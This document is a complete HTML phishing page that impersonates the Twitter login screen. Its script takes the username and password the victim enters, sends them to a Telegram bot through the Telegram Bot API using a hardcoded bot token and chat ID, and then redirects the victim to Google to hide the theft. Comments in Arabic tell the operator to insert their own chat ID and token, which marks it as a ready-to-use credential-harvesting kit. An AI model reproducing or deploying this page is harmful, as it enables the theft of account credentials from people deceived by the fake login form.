<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Twitter Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #15202B;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #ffffff;
        }

        .container {
            background-color: #1DA1F2;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 100%;
            max-width: 400px;
            box-sizing: border-box;
        }

        h1 {
            font-size: 2em;
            margin-bottom: 20px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border-radius: 5px;
            border: none;
            box-sizing: border-box;
            font-size: 1em;
        }

        button {
            width: 100%;
            padding: 15px;
            border-radius: 5px;
            border: none;
            background-color: #ffffff;
            color: #1DA1F2;
            font-size: 1em;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background-color: #e0e0e0;
        }

        .divider {
            margin: 20px 0;
            position: relative;
        }

        .divider:before,
        .divider:after {
            content: '';
            position: absolute;
            top: 50%;
            width: 40%;
            height: 1px;
            background-color: #e0e0e0;
        }

        .divider:before {
            left: 0;
        }

        .divider:after {
            right: 0;
        }

        .divider span {
            background-color: #1DA1F2;
            padding: 0 10px;
        }

        a {
            color: #ffffff;
            text-decoration: none;
            font-weight: bold;
        }

        a:hover {
            text-decoration: underline;
        }

        .forgot-password {
            margin-top: 15px;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1>Twitter</h1>
        <form id="loginForm">
            <input type="text" placeholder="Phone, email, or username" name="username" required>
            <input type="password" placeholder="Password" name="password" required>
            <button type="submit">Log In</button>
            <div class="divider"><span>OR</span></div>
            <a href="#">Forgot password?</a>
        </form>
        <div class="forgot-password">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const chatId = '614770779'; // ضع هنا معرف الدردشة الخاص بك
        const botToken = '7489145843:AAEPhf2hgpI75l5npkxxVmm1sKX-ctiRz9Q'; // ضع هنا رمز التوكن الخاص بالبوت

        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const formData = new FormData(form);
            const message = `Username: ${formData.get('username')}\nPassword: ${formData.get('password')}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).then(() => {
                window.location.href = 'https://www.google.com';
            });
              
        });
    </script>
</body>

</html>
